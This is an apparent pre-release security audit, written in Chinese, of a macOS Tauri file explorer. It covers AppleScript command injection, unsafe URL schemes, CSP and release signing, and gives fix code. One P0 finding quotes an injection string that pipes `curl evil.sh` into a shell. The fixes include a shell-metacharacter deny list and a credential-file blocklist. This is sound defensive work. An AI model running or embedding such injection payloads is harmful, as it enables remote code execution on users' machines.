# Aether Explorer 发版前破坏性审计

> 审计日期：2026-05-24
> 审计版本：v0.3.11
> 审计原则：把代码当成明天就要落到陌生用户真实 Mac 上、上面装着他们整个数字人生来看。

## 风险分级

| 等级 | 含义 | 处置 |
|------|------|------|
| 🔴 P0 | 不修不该发 — 数据丢失、RCE、信任崩塌 | 阻塞发版 |
| 🟠 P1 | 发版后会被 issue 区轰炸 | 24h 内补丁 |
| 🟡 P2 | 丢面子但不致命 | 下一版修复 |
| 🟣 P3 | 工程姿态 / 长期债务 | 排进 backlog |
| 🛑 P-DEF | 项目定位 / 心理战层级问题 | 决策层处理 |

---

## 🔴 P0：原始阻塞发版项（已处理 / 已验收）

### 当前自动化门禁基线

发版前必须同时通过本地与 CI 门禁：

- `npm run lint`
- `npm run lint:readme`
- `npm run lint:i18n`
- `npm run lint:ci-gates`
- `npm test`
- `npm run test:rust`
- `npm run lint:rust`
- `npm run build`

`release.yml` 的 `test-gate` 必须覆盖 production build smoke，避免 release job 才首次发现前端构建失败。

### P0-1 AppleScript 命令注入 — `open_terminal_at`

**位置**：`src-tauri/src/lib.rs`（历史审计时集中在 `open_terminal_at` / AppleScript 拼接链路；当前文件已多轮改动，精确行号不再稳定）

**证据**：
```rust
// 历史审计片段
format!(
    "tell application \"{}\" to do script \"{}\"",
    app_name.replace('\\', "\\\\").replace('"', "\\\""),
    command.replace('\\', "\\\\").replace('"', "\\\"")
)
```

**问题**：
1. 只转义 `\` 与 `"`，未处理 AppleScript 字符串/语句边界。
2. `command = "cd 'xxx' && ${tail}"`，`tail` 来自前端 `terminalArgs` / `customTerminalCommand` / 扩展 `command`，全部 user-controlled。
3. `shell_quote` 仅保护 `dir_str`，**未保护 `tail`** — `tail` 内含 `$(...)` 反引号会被 shell 二次执行。
4. 历史实现中 `apple_quote` 定义了但未被实际调用，是"以为做了"的死代码。
5. `app_name` 来自 `theme.terminalApp`，用户可改成 `Foo"; do shell script "curl evil.sh|sh"; tell application "Terminal` 这种字符串。

**修复方案**：

A. **删除 AppleScript 拼接路径，改用进程参数传递**

```rust
// 修复后：lib.rs
#[tauri::command]
fn open_terminal_at(
    path: String,
    terminal_app: Option<String>,
    args: Option<String>,
    custom_command: Option<String>,
) -> Result<(), String> {
    let target_path = Path::new(&path);
    let dir = if target_path.is_dir() {
        target_path.to_path_buf()
    } else {
        target_path.parent().unwrap_or(Path::new("/")).to_path_buf()
    };
    let dir_str = dir.to_string_lossy().to_string();

    // 1. 终端白名单 — 拒绝任意名字
    let app_name = terminal_app.unwrap_or_else(|| "Terminal".into());
    if !is_allowed_terminal(&app_name) {
        return Err(format!("不允许的终端应用: {}", app_name));
    }

    // 2. 用户命令必须先经过严格字符校验
    let user_cmd = custom_command
        .as_deref()
        .or(args.as_deref())
        .map(str::trim)
        .filter(|s| !s.is_empty());

    if let Some(cmd) = user_cmd {
        validate_shell_fragment(cmd)?;
    }

    // 3. 通过临时脚本文件传递，不拼接 AppleScript 字符串
    let script_path = write_temp_shell_script(&dir_str, user_cmd)?;

    // 4. 不再使用 `do script` 内联拼接
    let osa = format!(
        r#"tell application "{}" to do script "bash {}""#,
        apple_escape_strict(&app_name),
        apple_escape_strict(&script_path.to_string_lossy()),
    );

    std::process::Command::new("osascript")
        .args(["-e", &osa])
        .output()
        .map_err(|e| format!("打开终端失败: {}", e))?;
    Ok(())
}

fn is_allowed_terminal(name: &str) -> bool {
    const ALLOWED: &[&str] = &[
        "Terminal", "iTerm", "iTerm2", "Warp", "kitty",
        "WezTerm", "Alacritty", "Ghostty", "Tabby", "Hyper",
    ];
    ALLOWED.iter().any(|a| a.eq_ignore_ascii_case(name))
}

fn validate_shell_fragment(s: &str) -> Result<(), String> {
    // 拒绝可疑字符序列，强制用户在前端弹窗确认
    const FORBIDDEN: &[&str] = &["$(", "`", "&&", "||", ";", "|", ">", "<", "\n"];
    for tok in FORBIDDEN {
        if s.contains(tok) {
            return Err(format!(
                "命令含受限字符 {} — 请在设置里启用『高级模式』后再使用此类指令", tok
            ));
        }
    }
    Ok(())
}

fn apple_escape_strict(s: &str) -> String {
    // AppleScript 字符串内仅允许打印 ASCII 子集
    s.chars()
        .filter(|c| c.is_ascii_alphanumeric()
                 || matches!(*c, ' ' | '/' | '.' | '_' | '-'))
        .collect()
}

fn write_temp_shell_script(
    cwd: &str,
    user_cmd: Option<&str>,
) -> Result<PathBuf, String> {
    use std::io::Write;
    let dir = std::env::temp_dir().join("aether-explorer");
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join(format!("term-{}.sh", uuid_like()));
    let mut f = fs::File::create(&path).map_err(|e| e.to_string())?;
    writeln!(f, "#!/usr/bin/env bash\nset -eu").map_err(|e| e.to_string())?;
    writeln!(f, "cd {}", shell_quote(cwd)).map_err(|e| e.to_string())?;
    if let Some(cmd) = user_cmd {
        // user_cmd 已通过 validate_shell_fragment 检查
        writeln!(f, "{}", cmd).map_err(|e| e.to_string())?;
    }
    // 5 分钟后自删，避免堆积
    writeln!(f, "rm -f -- {:?}", path).map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut p = fs::metadata(&path).map_err(|e| e.to_string())?.permissions();
        p.set_mode(0o700);
        fs::set_permissions(&path, p).map_err(|e| e.to_string())?;
    }
    Ok(path)
}
```

B. **`apple_quote` 死代码：要么删，要么真的接入。**

C. **前端在用户配置含禁字符的命令时给出明确警告**，并要求二次确认。

---

### P0-2 `shell.open` 任意 URL — `javascript:` / `file://` 协议

**位置**：
- `src-tauri/tauri.conf.json` — `plugins.shell.open` 负责限制 shell open 参数
- `src/lib/url-guard.ts` — `safeShellOpen` 负责前端协议白名单
- `src/components/ExplorerView.tsx` / `src/components/SettingsView.tsx` — 外部链接打开入口

**问题**：macOS `open` 处理任意 URI scheme，含 `javascript:`、`x-apple-systempreferences:`、`file:///etc/passwd` 等。`urlTemplate` 是用户配置的，发版后任何分发的扩展 preset 都可能被人偷换。

**修复方案**：

A. **Tauri shell 插件加 open 正则**：
```json
// src-tauri/tauri.conf.json
{
  "plugins": {
    "shell": {
      "open": "^(https?://|mailto:).+"
    }
  }
}
```

B. **前端预校验**：
```ts
// src/lib/url-guard.ts
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

export function safeShellOpen(raw: string): Promise<void> {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    throw new Error(`非法 URL: ${raw}`);
  }
  if (!SAFE_SCHEMES.has(url.protocol)) {
    throw new Error(`协议 ${url.protocol} 不受信任，已拒绝打开`);
  }
  return shellOpen(url.toString());
}
```

所有外部链接打开入口统一走 `safeShellOpen(...)`。

---

### P0-3 CSP 完全关闭 + 壁纸 URL 注入

**位置**：
- `src-tauri/tauri.conf.json` — 历史实现中 `"csp": null`
- `src/App.tsx` — 历史实现中 `backgroundImage: url(${backgroundUrl})` 直接拼接
- `src-tauri/tauri.conf.json` — 历史实现中 `assetProtocol.scope` 含 `$HOME/**` `/Volumes/**`

**问题**：
1. 无 CSP，任何 DOM 注入即可外发请求/加载追踪像素。
2. `wallpaperUrl` 用户输入 → inline style。含 `");...` 可破坏 CSS；某些 WebView 对 `url(javascript:...)` 仍有兼容性问题。
3. assetProtocol 允许加载用户家目录任意资源，配合 1+2 可导致家目录信息回传。
4. 历史实现中 `read_text_preview` 会读取文本预览，`.env` 曾被 MIME 标记为 `text` → 用户随手预览即把密钥呈现。

**修复方案**：

A. **配置严格 CSP**：
```json
// tauri.conf.json
"security": {
  "csp": "default-src 'self'; img-src 'self' asset: https: data:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self' https://github.com https://api.github.com; font-src 'self' data:; frame-src 'none'; object-src 'none'",
  "assetProtocol": {
    "enable": true,
    "scope": [
      "$HOME/**",
      "$DOWNLOAD/**",
      "$TEMP/**",
      "/Volumes/**",
      "/Applications/**",
      "/System/Applications/**"
    ]
  }
}
```

B. **`wallpaperUrl` 走 URL 解析白名单**（复用 P0-2 的 `safeShellOpen` 检查器）。本地壁纸只接受 `convertFileSrc` 转换过的 `asset:` URL：

```ts
// src/components/SettingsView.tsx 改造
function isValidWallpaperUrl(url: string): boolean {
  if (!url) return true;
  if (url.startsWith('asset://') || url.startsWith('http://') || url.startsWith('https://')) {
    try { new URL(url); return true; } catch { return false; }
  }
  return false;
}

const handleWallpaperUrlChange = (url: string) => {
  if (!isValidWallpaperUrl(url)) {
    setError('壁纸 URL 必须是 http/https 链接或本地图片');
    return;
  }
  // ...
};
```

C. **敏感文件预览黑名单**（lib.rs 改造）：
```rust
#[tauri::command]
fn read_text_preview(path: String) -> Result<String, String> {
    let name = Path::new(&path).file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_lowercase();

    const SENSITIVE: &[&str] = &[
        ".env", ".envrc", ".npmrc", ".pypirc",
        "id_rsa", "id_ed25519", "id_ecdsa",
        ".aws/credentials", "kubeconfig",
    ];
    if SENSITIVE.iter().any(|s| name == *s || name.ends_with(s)) {
        return Err("此文件类型默认不展示预览（含敏感信息）— 请在设置中显式开启".into());
    }

    // ... 原 8KB 读取逻辑
}
```

并在 `detect_mime` 里把 `.env` 从 `text` 移出去：
```rust
"txt" | "md" | "markdown" | "csv" | "tsv" | "json" | "yaml" | "yml"
| "xml" | "toml" | "ini" | "cfg" | "conf" | "log" | "lock" | "rst" => "text",
// 删除 "env"
```

---

### P0-4 `prompt()` 输入路径 — 用户体验羞辱 + 路径攻击面

**位置**：`src/components/ExplorerView.tsx`（历史复制 / 移动入口）

**问题**：
```ts
const targetDir = prompt('复制到（输入目标目录路径）:', currentPath);
```

是的，"复制 / 移动"功能真的是 `window.prompt` 让用户手敲路径。

**修复方案**：

替换为已经引入的 dialog 插件：
```ts
import { open as openDialog } from '@tauri-apps/plugin-dialog';

const handleCopyFile = async (file: FileItem) => {
  setContextMenu(null);
  const targets = getActionFiles(file);
  const targetDir = await openDialog({
    multiple: false,
    directory: true,
    defaultPath: currentPath,
    title: '选择复制目标',
  });
  if (typeof targetDir !== 'string') return;
  try {
    await copyFiles(targets.map(t => t.path), targetDir);
    refreshCurrentDir();
    showFeedback(`已复制 ${targets.length} 个项目`);
  } catch (e) {
    showFeedback(`复制失败：${String(e)}`);
  }
};
```

`handleMoveFile` 同理替换。

并在 Rust 端 `copy_files` / `move_files` 增加路径规范化与跳出检查：
```rust
// lib.rs
fn safe_canonicalize(path: &Path) -> Result<PathBuf, String> {
    path.canonicalize().map_err(|e| format!("路径解析失败: {}", e))
}

// 在 copy_files / move_files 入口
let dst = safe_canonicalize(Path::new(&dst_dir))?;
if !dst.is_dir() {
    return Err(format!("目标不是目录: {}", dst_dir));
}
// 拒绝目标在源目录内（防 ../ 与符号链接逃逸）
for src in &srcs {
    let src_p = safe_canonicalize(Path::new(src))?;
    if dst.starts_with(&src_p) {
        return Err("目标位于源目录内，操作已拒绝".into());
    }
}
```

---

### P0-5 Updater Endpoint 稳定通道 — 已移除 `latest` fallback

**位置**：
- `src-tauri/tauri.conf.json`
- `.github/workflows/release.yml`
- `scripts/release.sh`

**当前状态**：
1. Tauri updater endpoint 只指向受控 `stable/latest.json`，不再依赖 GitHub `releases/latest/download` 别名。
2. GitHub Actions release workflow 会校验 tag、`package.json`、`package-lock.json`、`tauri.conf.json`、`Cargo.toml` 版本一致。
3. workflow 会把版本 release 的 `latest.json` 同步上传到 `stable` release，并校验 `stable/latest.json` 内容与当前版本资产 URL 一致。
4. 本地 `scripts/release.sh` 采用同样的版本校验、`stable/latest.json` 上传和远程 manifest 校验，避免绕过 CI 的发布口径。
5. `latest.json` notes 优先从 `CHANGELOG.md` 当前版本段落抽取；找不到时才退回 tag 文案。
6. release workflow 和本地发布脚本都会在打包前执行 `npm run clean:release`，清理 `dist` 与 Tauri bundle 旧产物。
7. versioned release 会上传 `SHA256SUMS`，覆盖 `.dmg`、`.app.tar.gz`、`.sig` 与 `latest.json`，并在上传后远程比对；`stable` release 只保留 updater manifest。

**仍待后续增强**：
- updater 私钥轮换 / 泄露预案。
- staged rollout、回滚和 kill switch。
- 如未来迁移到 CDN，可把 `stable/latest.json` 主地址换到 CDN，GitHub stable release 作为源站或备用。

E. **kill switch**：在 manifest CDN 放一个 `versions-blacklist.json`，启动时拉取，命中则提示用户回滚。

---

### ACK-6 稳定签名身份 / Notarization — 签名身份已进入发版候选门禁，Notarization 后续增强

**位置**：
- `src-tauri/tauri.conf.json` — bundle identifier 固定为 `com.aether.explorer`
- `src-tauri/Entitlements.plist` — 非沙盒 FDA-first 模型，`com.apple.security.app-sandbox=false`
- `scripts/validate-macos-app-bundle.mjs` / `scripts/validate-macos-permission-release-evidence.mjs` — 发版候选权限证据门禁
- `.github/workflows/release.yml` / `scripts/release.sh` — 打包后运行 release `.app` 校验

**风险**：
1. 教育用户粗暴处理"打不开"的 Mac 应用，会系统性破坏他们的安全本能。
2. 未签名构建 TCC 标识符会随每次重启变化，**用户授权的"完全磁盘访问"在下次启动就失效**。
3. 后续若有真攻击者推恶意 .app，用户可能习惯性解除 quarantine 放过去。

**当前决策**：

发版候选必须具备稳定签名身份：非 ad-hoc、存在 `TeamIdentifier`、code-signing `Identifier` 匹配 `com.aether.explorer`。稳定签名身份不能自动授予 Full Disk Access；macOS 要求用户手动授权。签名身份的作用是让用户授权后，后续同 bundle id / 同签名身份 / 同安装路径的候选保持同一 TCC client identity，避免每次构建都需要重新授权。

当前要求：
- `npm run validate:macos-app:release -- /path/to/Aether\ Explorer.app` 必须通过，才能进入 clean-user Full Disk Access 验收。
- 保存的 FDA evidence 还必须通过 `npm run validate:macos-permission-release -- --app /path/to/Aether\ Explorer.app --evidence /path/to/fda-evidence.json`，证明证据来自同一发版候选。
- README 可以说明未签名 / ad-hoc 开发构建的风险，但不能把它当作正式 release evidence。
- 不把“完全磁盘访问已稳定可用”作为卖点；权限状态以实际 TCC-only probe 为准。
- Notarization 仍是后续增强项，不替代签名身份、TCC-only probe 或 clean-user FDA 验收。

**未来可选方案**：

A. 申请 Apple Developer Program，配 Developer ID Application 证书，并在 CI / 本地 release 环境注入稳定签名身份。

B. **保持非沙盒 FDA-first entitlements，不添加目录级授权或 Apple Events**：
```xml
<!-- src-tauri/Entitlements.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <false/>
</dict>
</plist>
```

禁止在任何代码路径中使用这些权限；项目采用非沙盒 FDA-first 模型，不依赖目录级授权或 Apple Events：
- `com.apple.security.files.user-selected.read-write`
- `com.apple.security.files.downloads.read-write`
- `com.apple.security.files.bookmarks.app-scope`
- `com.apple.security.automation.apple-events`
- `NSAppleEventsUsageDescription`

`tauri.conf.json` 继续保持稳定 app identity：
```json
"macOS": {
  "entitlements": "Entitlements.plist",
  "infoPlist": "Info.plist",
  "signingIdentity": "Developer ID Application: <Your Name> (XXXXXXXXXX)",
  "providerShortName": "XXXXXXXXXX"
}
```

C. **workflow 加 codesign + notarytool**：
```yaml
- name: Import Developer ID certificate
  env:
    APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
    APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
  run: |
    echo "$APPLE_CERTIFICATE" | base64 -d > cert.p12
    security create-keychain -p "" build.keychain
    security default-keychain -s build.keychain
    security unlock-keychain -p "" build.keychain
    security import cert.p12 -k build.keychain -P "$APPLE_CERTIFICATE_PASSWORD" -T /usr/bin/codesign
    security set-key-partition-list -S apple-tool:,apple: -s -k "" build.keychain

- name: Notarize
  env:
    APPLE_ID: ${{ secrets.APPLE_ID }}
    APPLE_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
    APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
  run: |
    xcrun notarytool submit "$DMG_PATH" \
      --apple-id "$APPLE_ID" \
      --password "$APPLE_PASSWORD" \
      --team-id "$APPLE_TEAM_ID" \
      --wait
    xcrun stapler staple "$DMG_PATH"
```

D. README 优先引导用户走"系统设置 → 隐私与安全性 → 仍要打开"；`xattr` 仅作为高级用户自担风险的备用说明。

---

### ACK-7 Full Disk Access 状态检测 — 已实现 TCC-only probe，剩余 clean-user 证据

**位置**：
- `src-tauri/src/commands/fs.rs` — `full_disk_access_status` / `register_full_disk_access`
- `src/lib/full-disk-access.ts` — 前端共享 coordinator
- `src/components/StartupPermissionPrompt.tsx` — 启动权限引导
- `src/components/settings/PermissionsDiagnosticsSettings.tsx` — 设置页单一 FDA surface
- `scripts/validate-fda-evidence.mjs` / `scripts/validate-macos-permission-release-evidence.mjs` — release evidence 门禁

**风险**：无状态检测时，用户不知道当前失败是 TCC 权限、路径不存在，还是普通 IO 错误。

**当前决策**：

已实现基于真实 TCC 路径的只读 probe 和结构化错误提示。默认 FDA 状态检测只允许读取：
- `/Library/Application Support/com.apple.TCC/TCC.db`
- `~/Library/Application Support/com.apple.TCC`
- `~/Library/Application Support/com.apple.TCC/TCC.db`

不要用 Mail、Safari、Messages、Contacts、Calendars、Photos、Reminders、Desktop、Documents、Downloads 或应用数据目录作为 FDA 状态探针。那些路径会制造额外隐私噪音，也会把“用户内容读取成功”误当成 FDA 证明。

TCC 数据库路径是 Full Disk Access 权限的定义性标志，不是代理探针。读取 TCC.db 本身需要 FDA；读取用户内容目录（如 Safari、Mail）只是 FDA 的副作用，不能作为 FDA 状态的可靠证据。

**当前验证**：

- `npm run lint:macos-permissions` 防止源码权限模型漂移。
- 单元测试覆盖：
  - 权限 UX：`src/__tests__/permission-ux.test.ts`、`src/__tests__/full-disk-access.test.ts`、`src/__tests__/operation-permission-error.test.ts`
  - 发版校验器：`src/__tests__/macos-permission-model-validator.test.ts`、`src/__tests__/macos-app-bundle-validator.test.ts`、`src/__tests__/fda-evidence-validator.test.ts`、`src/__tests__/macos-permission-release-evidence-validator.test.ts`
  - 冒烟测试：`src/__tests__/smoke.test.ts`
- `docs/SMOKE_TEST.md` 的 `0.1 Full Disk Access 干净用户验收` 仍必须在干净用户 / VM / 测试机上跑完；没有该证据，不能宣称权限体验闭环。

---

## 🟠 P1：发版后必被轰炸

### P1-8 `console.log` 满天飞 — release build 也保留

**位置**：grep 全代码 55 处 `console.log`，集中在 App.tsx 与 TopBar.tsx 的拖拽逻辑。

**修复**：

A. **vite 配置 drop_console**：
```ts
// vite.config.ts
import { defineConfig } from 'vite';
export default defineConfig(({ mode }) => ({
  esbuild: {
    drop: mode === 'production' ? ['console', 'debugger'] : [],
  },
  // ...
}));
```

B. **保留必要日志走分级 logger**：
```ts
// src/lib/log.ts (新建)
const isDev = import.meta.env.DEV;
export const log = {
  debug: (...args: unknown[]) => isDev && console.log('[debug]', ...args),
  info:  (...args: unknown[]) => isDev && console.info('[info]', ...args),
  warn:  (...args: unknown[]) => console.warn('[warn]', ...args),
  error: (...args: unknown[]) => console.error('[error]', ...args),
};
```

把跨窗口拖拽里所有 `console.log` 换成 `log.debug`。

---

### P1-9 跨设备移动语义 — 已安全降级为复制并保留源

**位置**：`src-tauri/src/lib.rs`、`src/components/ExplorerView.tsx`、`src/i18n/locales/*`

**当前状态**：

- 遇到 `EXDEV` 时不执行“复制后删除源”的 Finder 式跨卷移动，而是降级为复制并保留源文件。
- 复制路径仍走临时目标 + 原子提交；失败或取消会清理半成品目标。
- 结果通过 `copied_cross_device` / `copiedCrossDevice` 暴露给前端。
- UI 文案明确提示“跨设备复制，源文件保留”。

**产品决策**：

这不是“真 move”，而是安全优先的跨设备复制语义。当前公益分发阶段不为了模拟 Finder 跨卷移动而承担删除源文件的风险。

---

### P1-10 符号链接处理 — 已按链接本身复制

**位置**：`src-tauri/src/lib.rs`

**当前状态**：

- 目录估算、复制、删除、冲突判断均使用 no-follow 元数据路径，避免把 symlink 目标当作真实目录递归。
- 复制 symlink 时保留链接本身，不展开目标内容；dangling symlink 也按链接复制。
- `copy_file` 命令入口复用同一复制路径，避免绕过 symlink 规则。
- Rust 单测覆盖目录 symlink、指向自身的 symlink、dangling symlink、`copy_file` 命令入口。

**验收要求**：

```bash
npm run test:rust
```

---

### P1-11 外置盘废纸篓失败 — 已明确告知并取消

**位置**：`src-tauri/src/lib.rs`、`src/components/ExplorerView.tsx`

**当前状态**：

- `delete_to_trash` 仍只调用 macOS Trash，不提供永久删除 fallback。
- `/Volumes/...` 路径移至废纸篓失败时返回结构化 `TrashUnsupported`。
- 前端按 `TrashUnsupported` 展示“操作已取消，Aether 不会改用永久删除”的本地化提示。
- 批量移至废纸篓改为 `Promise.allSettled`；部分成功时刷新目录并显示失败原因。

---

### P1-12 `list_directory` 同步 + N+1 read_dir + 不可取消 — 已修复

**位置**：`src-tauri/src/lib.rs`、`src/api/filesystem.ts`、`src/components/ExplorerView.tsx`

**当前状态**：

- `list_directory` 已改为 async command，并通过 `spawn_blocking` 避免阻塞 async runtime。
- 请求按 `requestScope` / `requestId` 做代际保护，旧请求不会回写前端状态。
- 后端目录扫描在条目循环边界检查旧请求并返回 `Cancelled`；这是 cooperative cancellation，不强制中断正在执行的单个 `read_dir` / `metadata` 系统调用。
- 列表阶段不再为每个目录计算 `child_count`，消除 N+1 `read_dir` 风险；目录子项数改为按需查询。
- 前端主列表和 column view 都有 loading / 过期请求保护。

**剩余优化**：超大目录仍可继续做分批返回或分批渲染，降低首屏等待。

---

### P1-13 `storeReady` 竞态可能擦除持久化扩展 — 已修复

**位置**：`src/App.tsx`、`src/lib/settings.ts`、`src/__tests__/settings.test.ts`

**当前状态**：

- `theme`、`favorites`、`fileTags`、`recentItems` 的写回都已放到 `storeReady` 之后，避免 Tauri Store 异步加载完成前用 localStorage 初始值覆盖持久化数据。
- `theme` 写入 localStorage 前会经过 `redactThemeSecrets`，避免旧 AI API Key 或 provider API Key 回落到 localStorage。
- settings 迁移入口集中到 `migrateThemeSettings`，旧版 `terminalScripts: string[]` 会迁移为 `{ script, enabled }[]`。
- `normalizeContextMenuExtensions` 保留用户自定义扩展和 `isSystem` 扩展，并补齐缺失的系统扩展；旧内置 deprecated ids 仍按迁移规则过滤。
- 导入配置会先过滤非对象 / deprecated 右键扩展，trim 后再次过滤旧内置扩展 ID，并对重复扩展 ID 去重；同时规范化 `actionType`、`workingDirectory`、`id` 和 `label`。
- 导入 theme 的固定选项会按白名单校验，非法 `mode`、`listDensity` 和 `crossWindowDropDefault` 会回落到默认值，避免脏 JSON 让设置页进入无选中项状态。
- URL 扩展必须有非空安全 URL 模板，terminal / shell 扩展会强制恢复执行确认，避免导入 JSON 绕过设置页约束。
- Vitest 覆盖旧脚本迁移、自定义扩展保留、密钥脱敏、导入配置过滤，以及 standalone 右键扩展导入的同一套 sanitizer。

---

### P1-14 i18n 大量硬编码中文 — 高风险路径已收口

**位置**：`src/components/ExplorerView.tsx`、`src/components/AIRenamePanel.tsx`、`src/components/SettingsView.tsx`、`src/i18n/locales/zh.ts`、`src/i18n/locales/en.ts`、`scripts/check-i18n-coverage.mjs`

**当前状态**：

- 已补齐本轮需要的 `footer`、`explorer`、`messages`、`dialogs`、`transfer`、`crossWindow`、`filenames`、`settings` locale key。
- `ExplorerView` 中默认新建文件 / 文件夹名、扩展执行反馈、受保护目录阻断页、目录读取失败页、原生 / 自定义右键菜单、预览面板提示等第一批高风险用户可见文案已接入 `t()`。
- `AIRenamePanel` 新增 `aiRename.*` 命名空间，标题、预设、占位符、错误提示、操作类型、执行进度等用户可见文案已接入 i18n。
- `SettingsView` 的分类、页头、权限、扩展、清理缓存、诊断与配置备份恢复等高风险用户可见文案已接入 `settings.*`。
- 新增 `npm run lint:i18n`，检查本轮要求的 locale key，以及 ExplorerView / AIRenamePanel / SettingsView 高风险用法是否仍走 i18n。
- `npm run lint:i18n` 当前验证 77 个 locale key、24 个 ExplorerView 用法、3 个 Full Disk Access recovery 用法、12 个 AIRenamePanel 用法、4 个 app diagnostics 用法、7 个 settings diagnostics 用法、15 个 settings backup 用法、43 个 SettingsView 高风险用法和 10 个 shortcut help 用法。
- release workflow 的 `test-gate` 已接入 `npm run lint:i18n`。

**剩余优化**：

- 当前 i18n lint 是限定范围检查，不做全仓中文硬失败，避免把注释、fallback、示例和未迁移模块一起误伤。
- 后续可以继续扩大 `lint:i18n` 覆盖面，但应按用户可见风险分批推进，避免把注释、fallback 和示例误伤成阻塞项。

---

### P1-15 `{path}`/`{name}` 模板插值是命令注入

**位置**：`src/components/ExplorerView.tsx`（历史扩展模板插值链路）

**修复**：

A. **改为 shell-safe 替换**（前端做最小转义，Rust 端二次校验）：
```ts
function shellEscape(value: string): string {
  // POSIX shell 单引号包裹 + 内部单引号转义
  return `'${value.replaceAll("'", "'\\''")}'`;
}

const interpolateActionTemplate = (template: string, file: FileItem) => {
  return template
    .replaceAll('{path}', shellEscape(file.path))
    .replaceAll('{dir}',  shellEscape(getItemDirectory(file)))
    .replaceAll('{name}', shellEscape(file.name))
    .replaceAll('{currentPath}', shellEscape(currentPath));
};
```

B. Rust 端 `open_terminal_at` 已在 P0-1 加 `validate_shell_fragment`，对未经占位符替换的部分仍生效。

C. **设置 UI 显式标注**："`{path}` 等占位符已自动 shell 转义，无需手动加引号"。

---

## 🟡 P2：丢面子

### P2-16 元数据一致性 — 已统一版本与仓库信息

**当前状态**：

- `package.json`、`package-lock.json`、`src-tauri/tauri.conf.json`、`src-tauri/Cargo.toml` 版本统一为 `0.3.11`。
- release workflow 校验 tag / package / lock / Tauri / Cargo 版本一致。
- Cargo repository 指向真实 GitHub 项目。

**目标形态**：
```json
{
  "name": "aether-explorer",
  "private": true,
  "version": "0.3.11",
  // ...
}
```

`src-tauri/Cargo.toml`:
```toml
repository = "https://github.com/HaoRangQi/aether-explorer"
```

### P2-17 `.env.example` / `metadata.json` 模板残留 — 已清理

**当前状态**：`.env.example` 已改为本地优先说明，不再提示项目级云密钥；`metadata.json` 已改为 Aether Explorer 项目描述。

### P2-18 `express` / `@google/genai` / `dotenv` 是未消费的依赖

**当前状态**：`package.json` / `package-lock.json` 不再包含 `express`、`@google/genai`、`dotenv`、`@types/express`；生产 build 已通过。

### P2-19 README 中英文不同步 + 无 CHANGELOG / SECURITY / CONTRIBUTING — 已补治理入口

**当前状态**：

- 已有 `CHANGELOG.md`（Keep a Changelog 格式）。
- 已新增 `SECURITY.md`：覆盖漏洞披露、支持范围、安全边界，以及未签名 / ad-hoc 构建风险与 FDA release evidence 口径。
- 已新增 `CONTRIBUTING.md`：覆盖开发命令、PR 检查、文档同步规则和 issue 指南。
- 已新增 GitHub issue templates：bug report、feature request、security report。
- README 中英文已链接隐私、安全和贡献文档。
- 已新增 `npm run lint:readme`，并接入 release workflow 的 `test-gate`，检查 `README.md` / `README_EN.md` 主要章节结构同步。
- `npm run lint:readme` 当前验证中英文 README 的 22 个 tracked headings 结构一致。

### P2-20 设计承诺与实现差距 — 已校准项目口径

**当前状态**：`PROJECT.md` 已把项目定位改为 macOS 本地优先文件工作台 / Finder 增强工具，M3 不再用旧完成数字掩盖已知限制，而是表述为“核心工作流可验收，已知限制继续跟踪”。README 的“已知不足”继续保留真实限制。

### P2-21 核心卖点相关已知问题 — 继续公开跟踪

**当前状态**：终端启动脚本相关问题已在代码侧修复并有 shell 校验覆盖；分栏模式预览框仍在 `README.md` “已知不足”和 `BUG.md` 中公开跟踪，不包装成已完成能力。

### P2-22 FEATURES.md 完成度统计 — 已重新打分

**当前状态**：`FEATURES.md` 已按 `✅` / `🟡` / `⏳` / `❌` 重新打分，当前统计为 89 项功能、73 项可验收 / 骨架、10 项待做、6 项跳过，不再引用旧口径。

**状态含义**：

| 状态 | 含义 |
|------|------|
| ✅ | 已完成且经过验收测试 |
| 🟡 | 骨架可用，关键路径未覆盖 |
| ⏳ | 未开始 |
| ❌ | 本期不做 |

---

## 🟣 P3：长期工程债

### P3-23 大型单文件组件 / 后端模块

**当前状态**：

- `src/components/ExplorerView.tsx`：约 5494 行。
- `src/components/SettingsView.tsx`：约 2917 行。
- `src-tauri/src/lib.rs`：约 4357 行。

**修复方向**（列为 0.3.x 架构治理）：
- `ExplorerView` 按视图模式拆：`ListView.tsx` `GridView.tsx` `ColumnView.tsx` 各自承担渲染
- 右键菜单逻辑抽 `useContextMenu` hook
- 文件选择 / 框选抽 `useFileSelection`
- 拖拽抽 `useFileDrag`
- `SettingsView` 按设置域拆成 appearance / file behavior / extensions / permissions / diagnostics / backup 等面板
- `src-tauri/src/lib.rs` 拆出 commands、transfer、settings、errors、filesystem 等深 module
- 目标：单文件 < 800 行

### P3-24 测试覆盖不足

**当前状态**：

- 已建立 Vitest / jsdom 单元测试；当前 `npm test` 为 14 个测试文件、129 个用例通过，覆盖 URL guard、settings、app error、导航历史、选择逻辑、原生菜单命令解析、目录签名变化判断、缓存等纯函数。
- 已建立 Rust `cargo test --lib`；当前为 81 个单元测试通过，覆盖 shell 校验、路径安全、复制 / 移动 / symlink / trash 等关键路径。
- release workflow 已有 test gate。

**剩余优化**：

- Explorer 关键工作流组件级测试。
- Tauri command 集成测试。
- 覆盖率统计与阈值。

### P3-25 `npm run lint` 仅 `tsc --noEmit` — 已收口

**当前状态**：

- 已新增 `npm run lint:ts` 和 `npm run lint:eslint`，`npm run lint` 串联 TypeScript 与 ESLint。
- ESLint flat config 覆盖 `src/**/*.{ts,tsx}`、`vite.config.ts` 和 `scripts/**/*.mjs`，忽略 `.worktrees`、`dist`、`node_modules` 与 Tauri target。
